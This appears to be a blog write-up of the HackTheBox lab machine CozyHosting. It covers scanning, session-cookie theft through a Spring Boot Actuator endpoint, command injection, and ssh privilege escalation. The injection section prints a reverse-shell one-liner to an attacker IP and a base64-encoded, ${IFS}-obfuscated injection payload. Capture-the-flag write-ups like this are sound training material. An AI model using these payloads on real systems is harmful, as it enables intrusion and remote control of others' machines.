---
title: "HackTheBox | CozyHosting"
layout: post
date: 2024-03-02 12:00
tag: 
- HackTheBox
- Pentesting
- CozyHosting
- Linux
- Easy
- Spring Boot
- Actuator
- JADX
image: https://labs.hackthebox.com/storage/avatars/eaed7cd01e84ef5c6ec7d949d1d61110.png
headerImage: true
writeups: true
hidden: true # don't count this post in blog pagination
description: "An easy retired HackTheBox machine."
category: project
author: johndoe
externalLink: false
star: false
---

# Overview

CozyHosting is an easy Linux machine that features a Spring Boot application. The application has the Actuator endpoint enabled. Enumerating the endpoint leads to the discovery of a user session cookie, leading to authenticated access to the main dashboard. The application is vulnerable to command injection, which is leveraged to gain a reverse shell on the remote machine. The user is allowed to run ssh as root, which is leveraged to fully escalate privileges.

---

# Nmap

```bash
nmap -A -T4 10.129.117.106
Starting Nmap 7.91 ( https://nmap.org ) at 2023-09-03 11:34 +01
Not shown: 988 closed ports
PORT      STATE    SERVICE       VERSION
22/tcp    open     ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp    open     http          nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
1175/tcp  filtered dossier
1521/tcp  filtered oracle
1718/tcp  filtered h323gatedisc
1875/tcp  filtered westell-stats
2602/tcp  filtered ripd
5087/tcp  filtered biotic
5910/tcp  filtered cm
8443/tcp  filtered https-alt
20005/tcp filtered btx
33354/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Gobuster

```bash
gobuster dir -u http://cozyhosting.htb -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/09/03 11:38:55 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 401) [Size: 97]
/error                (Status: 500) [Size: 73]
/index                (Status: 200) [Size: 12706]
/login                (Status: 200) [Size: 4431] 
/logout               (Status: 204) [Size: 0]
2023/09/03 11:41:18 Finished
```

I went to the */login* endpoint, but I don't have any credentials right now so I cannot login :

![!\[\[Pasted image 20230903114221.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230903114221.png>)

![!\[\[Pasted image 20230903120639.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230903120639.png>)

The */error* endpoint gave me a hint about Spring Boot :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230928160623.png>)

>Spring Boot includes a number of additional features called actuators to help monitor and control an application when it is pushed to production. Actuators allow controlling and monitoring an application using either HTTP or JMX endpoints. Auditing, health and metrics gathering can also open a hidden door to the server if an application has been misconfigured.

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators)

![!\[\[Pasted image 20230903131356.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230903131356.png>)

The */actuator/mappings* contains gave me another endpoint (*/actuator/sessions*) which contains kanderson's cookie :

![!\[\[Pasted image 20230906124123.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230906124123.png>)

![!\[\[Pasted image 20230906124042.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230906124042.png>)

I used that cookie to login to Cozy Cloud :

![!\[\[Pasted image 20230906124017.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230906124017.png>)

That dashboard contains an ssh form where I used Burp to intercept the request :

![!\[\[Pasted image 20230928161019.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230928161019.png>)

![!\[\[Pasted image 20230907121847.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230907121847.png>)

I noticed when I use an empty username it gives ssh usage error, so I thought about command injection :

![!\[\[Pasted image 20230907122139.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230907122139.png>)

Normal payload doesn't work so I tried to base64 encoding it, then use the *base64 -d* to decode it :

```bash
bash -i >& /dev/tcp/10.10.16.51/9999 0>&1
```

```bash
;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41MS85OTk5IDA+JjEK"${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash;
```

Then URL encoding (CTRL + U) > send the request :

![!\[\[Pasted image 20230928141032.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230928141032.png>)

Voilà we gain a shell as app user, Then I found a jar file which I downloaded to my local machine :

![!\[\[Pasted image 20230928141413.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230928141413.png>)

I used **JADX** to read the jar file.
In *application.properties* I found the password for *postgres*, and in *scheduled/FakeUser.class* I found the creds for user *kanderson* :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230928142540.png>)

![!\[\[Pasted image 20230928143105.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230928143105.png>)

I used the bellow command to login to the postgres db :

```bash
psql -h 127.0.0.1 -U postgres
```

[https://www.commandprompt.com/education/postgresql-basic-psql-commands](https://www.commandprompt.com/education/postgresql-basic-psql-commands)

![!\[\[Pasted image 20230928154054.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230928154054.png>)

I found the hash of admin user, I said maybe it's the password of the josh user too :

![!\[\[Pasted image 20230928154616.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230928154616.png>)

And yes that was the case :

![!\[\[Pasted image 20230928154706.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230928154706.png>)


# Root flag

The root flag was a piece of cake. Using **GTFObins** :

[https://gtfobins.github.io/gtfobins/ssh](https://gtfobins.github.io/gtfobins/ssh)

![!\[\[Pasted image 20230928154852.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230928154852.png>)

<br/>

# MACHINE PWNED!

<br/>

And that was it, I hope you enjoyed the writeup. If you have any questions you can [Contact Me](https://www.linkedin.com/in/hichamouardi).

<p>Happy Hacking!</p>